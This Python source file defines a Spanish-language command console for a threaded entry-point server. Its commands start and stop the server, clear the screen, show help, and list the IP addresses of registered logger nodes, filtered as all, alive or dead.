import API.server_entry_point as server
from threading import Thread
from API.util import PORT_GENERAL_ENTRY
import API.util as util
import time

class ShellServerEntry():

    def __init__(self):
        self.server = server.EntryPointServerTheaded(PORT_GENERAL_ENTRY, 10,10,1)
        #self.server.start_server()
        self.run()

    def options(self):
        print('<--- Ayuda --->')
        print('start :  Arranca el Server (comienza a escuchar)')
        print('stop : Detiene el Server (deja de escuchar)')
        print('exit : Apaga el Server')
        print('clear : Limpia la consola')
        print('loggers [option]: Lista los loggers validos registrados. ' +
              'Las opciones son: \n' + 
              '\t alives : Solo muestra a los vivos\n' +
              '\t deads : Solo muestra a los muertos\n' +
              '\t all : Muestra a todos\n')
        print('help : Muestra la ayuda')
        print('<---+---==---+--->')

    def run(self):
        self.options()
        while True:
            command = input()
            args = command.split()
            if args[0] == 'help':
                self.options()
            elif args[0] == 'loggers':
                if args[1] == 'alives':
                    self.show_loggers_ips('alives')
                if args[1] == 'deads':
                    self.show_loggers_ips('deads')
                elif args[1] == 'all':
                    self.show_loggers_ips('all')
                else:
                    print('comando invalido')
            elif args[0] == 'clear':
                util.clear()
            elif args[0] == 'stop':                
                print('Deteniendo servicio')
                self.server.stop()
                print('Servicio detenido')
            elif args[0] == 'start':
                self.server.start()
            elif args[0] == 'exit':
                if self.server.executing:
                    print('Deteniendo servicio')
                    self.server.stop()
                    print('Servicio detenido')                
                exit()
            else:
                print('comando invalido')
    
    def show_loggers_ips(self, mode= 'all'):
        if mode == 'all':
            with self.server.lock:
                ips = self.server.stalker_loggers.list.copy()
        elif mode == 'alives':
            with self.server.lock:
                ips = self.server.stalker_loggers.alive_dirs.copy()
        elif mode == 'deads':
            with self.server.lock:
                ips = self.server.stalker_loggers.deads_dirs.copy()
        else:
            print('Que verga metes?')
            return
        print("<---- Loggers IP ---->")
        for ip in ips:
            print(ip)
        print("<-------- END ------->")
                

s = ShellServerEntry()